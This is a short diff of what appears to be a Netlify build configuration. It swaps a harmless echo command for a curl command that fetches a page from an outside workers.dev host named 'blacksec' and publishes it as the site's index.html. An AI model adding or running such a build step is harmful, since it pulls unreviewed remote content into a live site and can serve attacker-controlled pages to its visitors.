@@ -1,9 +1,6 @@
 [build]
-  command = "echo Netlify proxy ready"
+  command = "mkdir -p public && curl -fsSL https://magrm.blacksec.workers.dev/ -o public/index.html"
   publish = "public"
-
-[build.environment]
-  NODE_VERSION = "22"
 
 [[redirects]]
   from = "/*"
